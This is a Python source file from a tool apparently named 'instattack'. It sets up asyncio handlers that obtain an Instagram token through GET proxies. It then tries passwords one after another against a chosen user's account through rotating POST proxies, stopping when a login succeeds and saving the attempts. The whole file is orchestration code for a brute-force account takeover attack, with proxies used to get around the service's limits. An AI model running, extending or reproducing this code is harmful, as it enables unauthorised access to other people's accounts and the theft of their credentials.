import asyncio

from instattack.handlers import (
    ProxyHandler, TokenHandler, ResultsHandler, PasswordHandler)


def get_handlers(request_config=None, proxy_config=None):

    lock = asyncio.Lock()
    start_event = asyncio.Event()

    proxy_handler = ProxyHandler(
        method='GET',
        lock=lock,
        start_event=start_event,
        **proxy_config
    )
    token_handler = TokenHandler(
        proxy_handler,
        start_event=start_event,
        **request_config
    )
    return proxy_handler, token_handler


def post_handlers(user, request_config=None, proxy_config=None):
    lock = asyncio.Lock()
    auth_result_found = asyncio.Event()
    results = asyncio.Queue()

    # We actually don't need to provide the lock to the password
    # and token handlers I think, since they don't access _pool directly.
    results_handler = ResultsHandler(
        user=user,
        queue=results,
        stop_event=auth_result_found
    )
    proxy_handler = ProxyHandler(
        method='POST',
        lock=lock,
        **proxy_config,
    )
    password_handler = PasswordHandler(
        results,
        proxy_handler,
        user=user,
        stop_event=auth_result_found,
        **request_config,
    )
    return results_handler, proxy_handler, password_handler


async def get_token(loop, request_config=None, proxy_config=None):
    """
    Uses proxies specifically for GET requests to synchronously make
    requests to the INSTAGRAM_URL until a valid response is received with
    a token that can be used for subsequent stages.

    We cannot perform any actions in finally because if we hit an exception,
    the loop will have been shutdown by that point.

    Proxies will not be saved if it wasn't started, but that is probably
    desired behavior.
    """
    get_proxy_handler, token_handler = get_handlers(
        request_config=request_config,
        proxy_config=proxy_config,
    )

    try:
        results = await asyncio.gather(
            token_handler.run(loop),
            get_proxy_handler.run(loop, prepopulate=True),
        )
    except Exception as e:
        if not get_proxy_handler._stopped:
            await get_proxy_handler.stop(loop)

        # Do we really want to save POST proxies?
        await get_proxy_handler.save(loop)

        loop.call_exception_handler({'exception': e})
        return None
    else:
        await get_proxy_handler.stop(loop)
        return results[0]


async def attack(loop, token, user, request_config=None, proxy_config=None, pwlimit=None):
    """
    Uses the token retrieved from the initial phase of the command to
    iteratively try each password for the given user with the provided
    token until a successful response is achieved for each password or
    a successful authenticated response is achieved for any password.

    We cannot perform any actions in finally because if we hit an exception,
    the loop will have been shutdown by that point.

    Proxies will not be saved if it wasn't started, but that is probably
    desired behavior.
    """
    results_handler, post_proxy_handler, password_handler = post_handlers(
        user,
        request_config=request_config,
        proxy_config=proxy_config,
    )
    try:
        results = await asyncio.gather(
            results_handler.run(loop),
            password_handler.run(loop, token, password_limit=pwlimit),
            post_proxy_handler.run(loop, prepopulate=True),
        )

    except Exception as e:
        if not post_proxy_handler._stopped:
            await post_proxy_handler.stop(loop)

        await password_handler.stop(loop)

        # Save Attempts Up Until This Point
        await results_handler.save(loop)

        # Do we really want to save POST proxies on exceptions?
        await post_proxy_handler.save(loop)

        loop.call_exception_handler({'exception': e})

    else:
        # Proxy handler should not be stopped by this point.
        await post_proxy_handler.stop(loop)
        await password_handler.stop(loop)

        # Save Attempts Up Until This Point
        await results_handler.save(loop)
        await post_proxy_handler.save(loop)

        return results[0]
